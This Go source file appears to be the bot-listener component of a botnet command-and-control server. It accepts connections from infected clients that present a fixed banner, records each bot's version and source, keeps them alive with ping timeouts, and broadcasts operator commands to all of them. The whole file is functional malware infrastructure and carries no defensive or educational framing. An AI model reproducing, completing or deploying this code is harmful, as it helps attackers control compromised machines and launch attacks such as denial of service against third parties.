package main

import (
	"log"
	"net"
	"time"
)

const pingTimeout = 90 * time.Second

func Slave() error {
	listener, err := net.Listen(Options.Templates.Slaves.Protocol, Options.Templates.Slaves.Listener)
	if err != nil {
		return err
	}

	log.Printf("\x1b[48;5;10m\x1b[38;5;16m Success \x1b[0m Bot server started on port > [%s]\r\n", Options.Templates.Slaves.Listener)

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}

		go Handle(conn)
	}
}

type Client struct {
	CID     int
	Version byte
	Source  string
	Conn    net.Conn
	Stream  chan []byte
}

func Handle(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buffer := make([]byte, 32)
	i, err := conn.Read(buffer)
	if err != nil || i > len(buffer) {
		return
	}

	for pos, block := range Banner {
		if buffer[pos] != block {
			return
		}
	}

	versionIdx := len(Banner)
	sourceIdx := len(Banner) + 1

	var New *Client = &Client{
		Conn:    conn,
		Stream:  make(chan []byte),
		Source:  "unknown",
		Version: buffer[versionIdx],
	}

	if sourceIdx < i {
		src := string(buffer[sourceIdx:i])
		if len(src) > 0 {
			New.Source = src
		}
	}

	AddClient(New)
	defer RemoveClient(New)

	type readResult struct {
		buf []byte
		err error
	}

	for {
		conn.SetDeadline(time.Now().Add(pingTimeout))

		readCh := make(chan readResult, 1)
		go func() {
			buf := make([]byte, 2)
			_, err := conn.Read(buf)
			readCh <- readResult{buf, err}
		}()

		select {
		case res := <-readCh:
			if res.err != nil {
				return
			}

		case broadcast := <-New.Stream:
			conn.SetDeadline(time.Now())
			<-readCh
			conn.SetDeadline(time.Now().Add(pingTimeout))

			if _, err := conn.Write(broadcast); err != nil {
				return
			}
		}
	}
}
